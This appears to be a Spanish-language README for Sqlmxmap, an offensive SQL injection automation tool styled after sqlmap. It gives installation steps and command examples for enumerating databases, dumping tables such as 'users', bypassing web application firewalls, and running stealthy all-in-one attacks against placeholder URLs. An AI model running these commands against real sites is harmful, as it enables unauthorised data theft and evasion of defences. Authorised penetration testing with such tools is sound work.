# Sqlmxmap 🚀

![Version](https://img.shields.io/badge/version-1.0-red)
![License](https://img.shields.io/badge/license-GPL%203.0-blue)

```text
╔═══════════════════════════════════════════════════════╗
║     ______       _               _                    ║
║    /  ___|     | |             | |                    ║
║    \ `--.  __ _| |_ __ ___   __| |                    ║
║     `--. \/ _` | | '_ ` _ \ / _` |                    ║
║    /\__/ / (_| | | | | | | | (_| |                    ║
║    \____/ \__,_|_|_| |_| |_|\__,_|                    ║
║                                                       ║
║      SQL Injection Automation Tool - v1.0             ║
║            ' OR 1=1 -- -                              ║
╚═══════════════════════════════════════════════════════╝

Herramienta ofensiva de inyección SQL automatizada para pentesters y ethical hackers. Inspirada en sqlmap pero más ligera y personalizable.

⚡ Instalación
git clone https://github.com/Falconmx1/Sqlmxmap.git
cd Sqlmxmap
pip install -r requirements.txt

## 🚀 Modos de uso avanzado

### Enumerar bases de datos
```bash
python sqlmxmap.py -u "http://test.com/page.php?id=1" --dbs -v

Enumerar tablas
python sqlmxmap.py -u "http://test.com/page.php?id=1" --tables nombre_db -vv

Volcar tabla completa
python sqlmxmap.py -u "http://test.com/page.php?id=1" --dump users --stealth

Modo POST con evasión de WAF
python sqlmxmap.py -u "http://test.com/login.php" -p username -m POST -d "username=admin&password=123" --waf-evasion -v

Detectar motor de DB
python sqlmxmap.py -u "http://test.com/page.php?id=1" --detect-db -v

Modo completo (stealth + verboso)
python sqlmxmap.py -u "http://test.com/page.php?id=1" --dbs --tables mysql --dump users --stealth -vv
sqlmxmap.py -h

## 🚀 Modos ULTIMATE de uso

### 🔥 Con Cookies y Proxy
```bash
python sqlmxmap.py -u "http://test.com/page.php?id=1" --cookies "PHPSESSID=abc123; security=low" --proxy "http://127.0.0.1:8080" --dbs -v

⚡ Multi-threading para velocidad
bash

python sqlmxmap.py -u "http://test.com/page.php?id=1" --threads 20 --dbs --tables mydb --dump users -vv

📊 Exportación a JSON/CSV
python sqlmxmap.py -u "http://test.com/page.php?id=1" --dbs --output results.json
python sqlmxmap.py -u "http://test.com/page.php?id=1" --dump users --output data.csv

🛡️ WAF Bypass avanzado (Niveles 1-4)
# Nivel 1: Payloads básicos
python sqlmxmap.py -u "http://test.com/page.php?id=1" --waf-level 1 --dbs

# Nivel 2: Comentarios y encoding básico
python sqlmxmap.py -u "http://test.com/page.php?id=1" --waf-level 2 --dbs

# Nivel 3: Bypass con caracteres especiales
python sqlmxmap.py -u "http://test.com/page.php?id=1" --waf-level 3 --dump users

# Nivel 4: Payloads avanzados + time-based
python sqlmxmap.py -u "http://test.com/page.php?id=1" --waf-level 4 --detect-db

🥷 Modo Stealth completo
python sqlmxmap.py -u "http://test.com/page.php?id=1" --stealth --waf-level 3 --threads 3 -vv --output stealth_results.json

💣 Comando todo-en-uno (modo bestia)
python sqlmxmap.py -u "http://test.com/page.php?id=1" --dbs --tables mysql --dump users --detect-db --stealth --waf-level 4 --threads 10 --output full_attack.json --cookies "PHPSESSID=xyz" --proxy "http://127.0.0.1:8080" -vvv
